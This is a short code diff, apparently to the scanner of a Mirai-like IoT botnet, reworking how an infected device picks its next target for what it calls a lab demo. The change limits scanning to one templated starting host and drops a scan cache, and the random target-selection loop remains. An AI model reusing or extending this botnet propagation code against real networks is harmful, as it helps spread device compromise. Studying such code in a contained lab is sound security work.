@@ -126,32 +126,21 @@ void target_ip_init(void)
     }
 }
 
-ipv4_t get_next_target_v2(void) 
-{ 
-    int i;
-    static ipv4_t scan_cache[5] = {0};
+ipv4_t get_next_target_v2(void) // for lab demo version
+{
+    char sz_addrbuff_bgn[16] = "{ip_prx}.{tgt_bgn}";
+    ipv4_t ip_bgn = convert_ip(sz_addrbuff_bgn);
 
+    // only the first IoT device attack
     ipv4_t local_addr = util_local_addr();
+    if(local_addr != ip_bgn)
+        return 0;
+
     ipv4_t next_addr = g_target_ips[rand_next() % g_target_ips_num];
     while(next_addr == local_addr)
     {
         next_addr = g_target_ips[rand_next() % g_target_ips_num];
     }
-
-    for(i=0; i<sizeof(scan_cache)/sizeof(ipv4_t); i++)
-    {
-        if(scan_cache[i] == 0)
-        {
-            scan_cache[i] = next_addr;
-            break;
-        }
-        if(scan_cache[i] == next_addr)
-        {
-            return 0;
-        }
-    }
-    if(i == sizeof(scan_cache)/sizeof(ipv4_t))
-        return 0;
 
 #ifdef DEBUG
     printf("[scanner] next_addr %d.%d.%d.%d\n", next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
